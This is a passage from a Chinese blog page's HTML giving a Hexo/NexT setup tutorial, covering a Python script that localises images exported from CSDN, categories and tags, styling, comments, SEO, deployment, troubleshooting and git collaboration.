class="line"></span><br><span class="line">        <span class="keyword">if</span> download_image(url, local_path):</span><br><span class="line">            <span class="comment"># 使用标准Markdown语法，引用本地文件</span></span><br><span class="line">            new_link = <span class="string">f&quot;![<span class="subst">&#123;alt_text&#125;</span>](<span class="subst">&#123;filename_on_disk&#125;</span>)&quot;</span></span><br><span class="line">            content = content.replace(<span class="keyword">match</span>.group(<span class="number">0</span>), new_link)</span><br><span class="line">            success_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 已保存：<span class="subst">&#123;filename_on_disk&#125;</span> &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存修改后的内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> success_count, <span class="built_in">len</span>(matches)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🚀 开始处理CSDN导出的图片...&quot;</span>)</span><br><span class="line">    total_success = <span class="number">0</span></span><br><span class="line">    total_images = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(POSTS_DIR):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.md&#x27;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        blog_path = os.path.join(POSTS_DIR, filename)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n📄 正在处理：<span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        success, total = process_markdown_file(blog_path)</span><br><span class="line">        total_success += success</span><br><span class="line">        total_images += total</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🎉 <span class="subst">&#123;filename&#125;</span> 处理完成：<span class="subst">&#123;success&#125;</span>/<span class="subst">&#123;total&#125;</span> 张图片成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🎊 全部完成！总计处理 <span class="subst">&#123;total_success&#125;</span>/<span class="subst">&#123;total_images&#125;</span> 张图片&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n📝 接下来执行：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>3.2 使用说明</strong></p>
<ol>
<li><strong>修改路径</strong>：将脚本中的 <code>POSTS_DIR</code> 修改为你博客文章的实际路径（如 <code>F:\myBlog\source\_posts</code>）。</li>
<li><strong>运行脚本</strong>：在命令行中进入脚本所在目录，执行 <code>python fix_csdn_images.py</code>。</li>
<li><strong>验证结构</strong>：脚本执行后，你的文章目录结构应变为：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">source/_posts/</span><br><span class="line">├── SSH隧道技术.md</span><br><span class="line">└── SSH隧道技术/</span><br><span class="line">    ├── 图片描述_1.png</span><br><span class="line">    ├── 图片描述_2.jpg</span><br><span class="line">    └── ...</span><br></pre></td></tr></table></figure></li>
<li><strong>本地预览</strong>：执行 <code>hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server</code>，在浏览器中访问 <code>http://localhost:4000</code>，确认图片已正常加载。</li>
</ol>
<hr>
<h1 id="四、核心：搭建清晰的「分类-标签」体系（解决文章归类问题）"><a href="#四、核心：搭建清晰的「分类-标签」体系（解决文章归类问题）" class="headerlink" title="四、核心：搭建清晰的「分类&#x2F;标签」体系（解决文章归类问题）"></a>四、核心：搭建清晰的「分类&#x2F;标签」体系（解决文章归类问题）</h1><p>分类是博客的“骨架”，标签是“索引”，两者结合让读者快速找到内容，也让你的博客结构更规整。</p>
<p><strong>4.1 先明确规则（避免混乱）</strong></p>
<ul>
<li><strong>分类</strong>：层级化、不重复（例如：<code>技术</code> → <code>网络安全</code>，<code>工具</code> → <code>Hexo配置</code>）。一篇文章建议1-2个主分类。</li>
<li><strong>标签</strong>：扁平化、多维度（例如：一篇「Hexo分类配置」的文章，标签可设 <code>Hexo</code>、<code>博客搭建</code>、<code>分类管理</code>）。一篇文章可多个标签。</li>
</ul>
<p><strong>4.2 步骤1：创建「分类页」「标签页」（让导航能访问）</strong><br>Hexo需要手动创建分类&#x2F;标签的“容器页面”，否则导航栏点击后会404：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建分类页面</span></span><br><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建标签页面</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后分别编辑这两个文件的 Front-matter，添加 <code>type</code> 标识：</p>
<ul>
<li><code>source/categories/index.md</code>：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
<li><code>source/tags/index.md</code>：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>4.3 步骤2：给文章分配「分类&#x2F;标签」</strong><br>编辑每篇文章（<code>source/_posts/xxx.md</code>）的 Front-matter：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">&quot;什么是SSH隧道及相关技术&quot;</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-10</span></span><br><span class="line"><span class="attr">updated:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">技术</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">网络安全</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">SSH</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">隧道技术</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">服务器</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<p><strong>4.4 步骤3：让分类&#x2F;标签显示在导航栏</strong><br>在 <code>themes/next/_config.yml</code> 的 <code>menu</code> 配置中，添加 <code>categories</code> 和 <code>tags</code> 菜单项（已在上文2.2节中包含）。</p>
<hr>
<p><strong>二、优化导航与功能：让博客更好用</strong></p>
<p><strong>1. 开启「搜索功能」（必备！）</strong><br>已在 <code>themes/next/_config.yml</code> 中配置 <code>local_search</code>，确保已安装 <code>hexo-generator-searchdb</code> 插件。</p>
<p><strong>2. 代码高亮优化（程序员必备）</strong><br>已在 <code>themes/next/_config.yml</code> 中配置 <code>codeblock.copy_button</code>，并在 <code>hexo/_config.yml</code> 中启用了 <code>highlight.line_number</code>。</p>
<p><strong>3. 图片处理：避免失效+优化显示</strong></p>
<ul>
<li><strong>方案1：本地图片（推荐）</strong>：通过 <code>post_asset_folder: true</code> + <code>marked.post_asset: true</code> 配置，脚本已自动将图片存入文章同名文件夹，使用 <code>![描述](图片名.png)</code> 的相对路径，<strong>永不失效</strong>。</li>
<li><strong>方案2：图床</strong>：若需多设备编辑，可用PicGo上传至GitHub图床，复制链接粘贴。<strong>但强烈推荐方案1</strong>，数据完全可控。</li>
<li><strong>优化显示</strong>：在Markdown中，使用以下代码让图片居中并限制宽度：<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 居中+限制宽度 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片链接&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;描述&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: block; margin: 0 auto; max-width: 80%;&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="五、外观优化：让博客更个性化"><a href="#五、外观优化：让博客更个性化" class="headerlink" title="五、外观优化：让博客更个性化"></a>五、外观优化：让博客更个性化</h1><p><strong>5.1 选择Next主题风格（Scheme）</strong><br>在 <code>themes/next/_config.yml</code> 中设置：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span>  <span class="comment"># 推荐：简洁大气，适配分类/标签</span></span><br><span class="line"><span class="comment"># scheme: Mist  # 更紧凑</span></span><br><span class="line"><span class="comment"># scheme: Pisces # 卡片式</span></span><br><span class="line"><span class="comment"># scheme: Muse  # 默认</span></span><br></pre></td></tr></table></figure>

<p><strong>5.2 自定义颜色&#x2F;字体</strong><br>编辑 <code>themes/next/source/css/_custom/custom.styl</code> 文件：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义导航栏背景色</span></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#2c3e50</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义链接颜色</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#3498db</span>;</span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局字体（推荐思源黑体）</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Source Han Sans CN&quot;</span>, <span class="string">&quot;PingFang SC&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码字体（推荐Fira Code）</span></span><br><span class="line"><span class="selector-tag">code</span>, pre &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Fira Code&quot;</span>, <span class="string">&quot;Consolas&quot;</span>, monospace;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面背景图（可选）</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;/images/bg.jpg&#x27;</span>);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);</span><br><span class="line">  <span class="attribute">background-blend-mode</span>: overlay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>注意</strong>：将背景图 <code>bg.jpg</code> 放入 <code>source/images/</code> 目录下。</p>
</blockquote>
<p><strong>5.3 添加背景图&#x2F;头像</strong></p>
<ul>
<li><strong>头像</strong>：在 <code>themes/next/_config.yml</code> 中设置：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.jpg</span>  <span class="comment"># 图片放在 source/images/ 目录下</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">1.0</span></span><br></pre></td></tr></table></figure></li>
<li><strong>背景图</strong>：已在上文 <code>custom.styl</code> 中配置。</li>
</ul>
<hr>
<h1 id="六、增强互动与体验：添加评论-阅读量"><a href="#六、增强互动与体验：添加评论-阅读量" class="headerlink" title="六、增强互动与体验：添加评论&#x2F;阅读量"></a>六、增强互动与体验：添加评论&#x2F;阅读量</h1><p><strong>6.1 评论系统（推荐 Gitalk，适配 GitHub Pages）</strong><br>已在 <code>themes/next/_config.yml</code> 中配置 <code>gitalk</code>，请按说明申请GitHub OAuth App并填入 <code>client_id</code> 和 <code>client_secret</code>。</p>
<p><strong>2. 阅读量统计（不蒜子，无需注册）</strong><br>已在 <code>themes/next/_config.yml</code> 中启用 <code>busuanzi_count</code>。</p>
<hr>
<h1 id="七、SEO优化：让博客被搜索引擎收录"><a href="#七、SEO优化：让博客被搜索引擎收录" class="headerlink" title="七、SEO优化：让博客被搜索引擎收录"></a>七、SEO优化：让博客被搜索引擎收录</h1><p><strong>7.1 配置站点信息（Hexo根目录 <code>_config.yml</code>）</strong><br>已在上文2.1节中包含 <code>title</code>, <code>subtitle</code>, <code>description</code>, <code>keywords</code>, <code>author</code>, <code>language</code>, <code>timezone</code>。</p>
<p><strong>7.2 生成站点地图</strong><br>已在上文1.3节安装了 <code>hexo-generator-sitemap</code> 和 <code>hexo-generator-baidu-sitemap</code> 插件。无需额外配置，它们会自动生成 <code>sitemap.xml</code> 和 <code>baidu_sitemap.xml</code>。</p>
<p><strong>7.3 提交站点到搜索引擎</strong></p>
<ul>
<li><strong>Google 搜索控制台</strong>：添加你的域名，提交 <code>https://你的博客地址/sitemap.xml</code>。</li>
<li><strong>百度搜索资源平台</strong>：添加你的域名，提交 <code>https://你的博客地址/baidu_sitemap.xml</code>。</li>
</ul>
<hr>
<h1 id="八、细节优化：提升质感"><a href="#八、细节优化：提升质感" class="headerlink" title="八、细节优化：提升质感"></a>八、细节优化：提升质感</h1><p><strong>8.1 文章排版</strong></p>
<ul>
<li><strong>折叠块</strong>（适合长代码&#x2F;补充说明）：<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">details</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></span>点击查看补充说明<span class="language-xml"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span></span><br><span class="line">这里是折叠的内容...</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
<li><strong>每篇文章添加「前言&#x2F;小结」</strong>，让结构更清晰。</li>
</ul>
<p><strong>8.2 404 页面</strong><br>创建 <code>source/404.md</code>：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">页面不存在</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-11-11</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">&lt;div</span> <span class="string">style=&quot;text-align:</span> <span class="string">center;</span> <span class="attr">margin-top:</span> <span class="string">50px;&quot;&gt;</span></span><br><span class="line">  <span class="string">&lt;h1&gt;404</span> <span class="bullet">-</span> <span class="string">页面走丢啦～&lt;/h1&gt;</span></span><br><span class="line">  <span class="string">&lt;p&gt;你访问的页面不存在或已被移动&lt;/p&gt;</span></span><br><span class="line">  <span class="string">&lt;a</span> <span class="string">href=&quot;/&quot;</span> <span class="string">style=&quot;color:</span> <span class="comment">#3498db; font-size: 18px;&quot;&gt;返回首页&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>8.3 关闭无用功能</strong><br>在 <code>themes/next/_config.yml</code> 中关闭不需要的功能：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">sharejs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="九、部署与备份"><a href="#九、部署与备份" class="headerlink" title="九、部署与备份**"></a>九、部署与备份**</h1><p><strong>9.1 部署流程</strong><br>每次修改后，执行以下命令部署：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure>

<p><strong>9.2 本地测试</strong><br>在部署前，务必先在本地测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate --debug</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
<p>访问 <code>http://localhost:4000</code>，检查：</p>
<ul>
<li>✅ 文章正常显示</li>
<li>✅ 图片正确加载</li>
<li>✅ 样式正常</li>
<li>✅ 搜索、分类、标签功能正常</li>
</ul>
<p><strong>9.3 备份</strong><br>将 Hexo 根目录的 <code>_config.yml</code>、<code>themes/next/_config.yml</code>、<code>source/</code> 目录（文章+图片）备份到 GitHub（新建一个仓库，比如 <code>blog-source</code>），避免电脑故障丢失数据。</p>
<hr>
<h1 id="十、故障排除大全"><a href="#十、故障排除大全" class="headerlink" title="十、故障排除大全"></a>十、故障排除大全</h1><p><strong>10.1 图片不显示问题</strong></p>
<ul>
<li><strong>症状</strong>：图片显示为空白或404。</li>
<li><strong>解决方案</strong>：<ol>
<li><strong>检查配置</strong>：确保 <code>_config.yml</code> 中 <code>post_asset_folder: true</code> 和 <code>marked.prepend_root: true</code> 已开启。</li>
<li><strong>清理缓存</strong>：执行 <code>hexo clean</code> 后重新 <code>hexo generate</code>。</li>
<li><strong>检查路径</strong>：浏览器F12查看Network标签，确认图片请求的URL是 <code>文章名/图片名.png</code> 的相对路径。</li>
</ol>
</li>
</ul>
<p><strong>10.2 部署失败问题</strong></p>
<ul>
<li><strong>常见错误1：权限拒绝</strong><ul>
<li><strong>解决方案</strong>：使用HTTPS地址或配置SSH密钥。</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/用户名/你的用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure></li>
<li><strong>常见错误2：分支不存在</strong><ul>
<li><strong>解决方案</strong>：确认你的GitHub仓库默认分支是 <code>main</code> 还是 <code>gh-pages</code>，并相应修改 <code>branch</code> 配置。</li>
</ul>
</li>
</ul>
<p><strong>10.3 主题显示异常</strong></p>
<ul>
<li><strong>解决方案</strong>：<ol>
<li>确认主题安装：<code>npm list hexo-theme-next</code>。</li>
<li>检查 <code>hexo/_config.yml</code> 中 <code>theme: next</code>。</li>
<li>清理重新安装：<code>rm -rf node_modules &amp;&amp; npm install</code>。</li>
</ol>
</li>
</ul>
<p><strong>10.4 时间显示问题</strong></p>
<ul>
<li><strong>症状</strong>：文章时间相差8小时。</li>
<li><strong>解决方案</strong>：确保 <code>hexo/_config.yml</code> 中 <code>timezone: &#39;Asia/Shanghai&#39;</code>。</li>
</ul>
<hr>
<h1 id="十一、优化与进阶"><a href="#十一、优化与进阶" class="headerlink" title="十一、优化与进阶"></a>十一、优化与进阶</h1><p><strong>11.1 性能优化</strong></p>
<ul>
<li>在 <code>themes/next/_config.yml</code> 中启用 <code>lazyload: enable: true</code>。</li>
<li>在 <code>hexo/_config.yml</code> 中启用 <code>highlight.line_number: true</code>。</li>
</ul>
<p><strong>11.2 自定义域名</strong></p>
<ul>
<li>在 <code>source/</code> 目录下创建一个名为 <code>CNAME</code> 的文件。</li>
<li>文件内容写入你的域名，例如：<code>yourdomain.com</code>。</li>
<li>在你的域名DNS服务商处，添加一条CNAME记录，指向 <code>你的用户名.github.io</code>。</li>
</ul>
<hr>
<h1 id="十二、实用命令速查"><a href="#十二、实用命令速查" class="headerlink" title="十二、实用命令速查"></a>十二、实用命令速查</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建新文章</span></span><br><span class="line">hexo new <span class="string">&quot;文章标题&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地写作（预览草稿）</span></span><br><span class="line">hexo server --draft</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅生成静态文件</span></span><br><span class="line">hexo generate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制清理缓存</span></span><br><span class="line">hexo clean --debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看Hexo版本</span></span><br><span class="line">hexo version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键部署（最常用）</span></span><br><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="十三、博客协作更新"><a href="#十三、博客协作更新" class="headerlink" title="十三、博客协作更新"></a>十三、博客协作更新</h1><p>13.1 拉取myBlog + 配置git</p>
<ul>
<li>git clone <a href="mailto:&#103;&#105;&#116;&#64;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#x6d;">git@github.com</a>:用户名&#x2F;myBlog.git</li>
<li>git init (初始化刚拉取的myBlog)</li>
<li>git remote add origin <a href="mailto:&#103;&#x69;&#116;&#x40;&#103;&#105;&#x74;&#104;&#x75;&#x62;&#46;&#99;&#111;&#x6d;">git@github.com</a>:用户名&#x2F;myBlog.git (关联仓库)</li>
</ul>
<p>13.2 下载nodejs + hexo</p>
<ul>
<li>官网下载nodejs</li>
<li>下载 hexo npm install -g hexo-cli</li>
</ul>
<p>13.3 nmp 相关插件下载</p>
<ul>
<li>npm install</li>
<li>npm install hexo-deployer-git –save</li>
</ul>
<blockquote>
<p>因为 myBlog 已经hexo 初始化完毕，不需要再进行初始化<br>myBlog 私仓用于博客协作更新（用git）, 用hexo deploy 更新博客仓</p>
</blockquote>
<p>注意：每次修改文章或其他文件时，hexo clean -&gt; hexo g -&gt; hexo deploy -&gt; git add . -&gt; git commit …. -&gt; git push origin main</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZQ-Rooie-Hacker</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">92k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">5:06</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
